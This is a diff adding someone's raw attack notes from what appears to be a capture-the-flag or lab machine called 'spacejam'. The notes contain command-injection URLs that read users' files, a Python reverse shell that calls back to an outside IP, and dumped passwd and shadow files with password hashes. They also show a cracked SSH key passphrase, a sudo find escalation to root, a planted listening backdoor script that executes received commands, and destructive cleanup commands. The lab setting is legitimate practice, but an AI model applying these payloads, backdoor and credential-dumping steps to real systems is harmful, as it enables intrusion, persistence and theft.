@@ -1,0 +1,201 @@
+export IP= 
+
+
+
+
+http://10.10.112.236:3000/?cmd=
+
+http://10.10.163.118:3000/?cmd=cat%20/home/bunny/user.txt
+
+
+http://10.10.163.118:3000/?cmd=cat%20/home/jordan/user.txt
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.27.82",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+
+
+*change root passwd before moving on
+passwd:toortoor
+
+
+
+/root.txt
+
+218f5ea7a4d711eef60171e5c92ba9e1
+
+123
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+jordan:x:1000:1000:,,,:/home/jordan:/bin/bash
+bunny:x:1001:1001:,,,:/home/bunny:/bin/rbash
+telnetd:x:112:119::/nonexistent:/bin/false
+colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
+postgres:x:114:122:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+
+
+
+root:$6$a.kpa8p7$8MyQWqdXi8kIyb4CgqAViyCa51fW55x0m3paAVcXESs3t03iuUuLq9OQRsoHk7c5HhIsBC5HDddfXWElTK1Ha0:18317:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+lxd:*:18317:0:99999:7:::
+mysql:!:18317:0:99999:7:::
+messagebus:*:18317:0:99999:7:::
+uuidd:*:18317:0:99999:7:::
+dnsmasq:*:18317:0:99999:7:::
+sshd:*:18317:0:99999:7:::
+jordan:$6$6jKm02ie$qiEzYLKjGwoxz5Fl.r/oSXEqeX3qgAZRKmZqdz8GFpTck6lj5b3RUhA6weUckJSFHuFdAbvdI6K5YWGx7N5Ph.:18317:0:99999:7:::
+bunny:$6$HOScqZHA$ewn.WIghxLt7yv.nn.6jtaR8HNaKGklcG5bQqZirIDtZUNIgnek3JREVx.0huE8.oYYsaGJv4FTJhLR296czW1:18317:0:99999:7:::
+telnetd:*:18317:0:99999:7:::
+colord:*:18317:0:99999:7:::
+postgres:*:18317:0:99999:7:::
+
+
+
+
+
+
+
+
+
+persistence 
+
+
+cd /home/jordan/.ssh/
+
+cat id_rsa
+
+
+
+*ssh2john
+
+pass123          (jordan_rsa)
+
+
+
+
+User jordan may run the following commands on spacejam:
+    (ALL) NOPASSWD: /usr/bin/find
+
+
+
+*gtfobins
+sudo find . -exec /bin/sh \; -quit
+
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'  
+
+
+
+
+
+
+
+
+
+*random
+
+/home/jordan/easyaccess.py
+
+
+#!/usr/bin/env python3
+
+import socket
+import os
+
+HOST = '0.0.0.0' 
+PORT = 61432    
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+    conn, addr = s.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode("utf-8")
+            output = os.popen(str(data)).read()
+            cmd = str.encode(output)
+            if not data:
+                break
+            conn.sendall(cmd)
+
+
+
+
+
+
+
+*patching 
+
+
+rm -rf /home/bunny/simple-command-injection/*
+
+
+
+(find and kill node.js process)
+
+ps aux
+
+kill -9 1289
+kill -9 1277
+
+
+*in browser trying to connect to port 3000
+(unable to connect to server)
+
+*got em
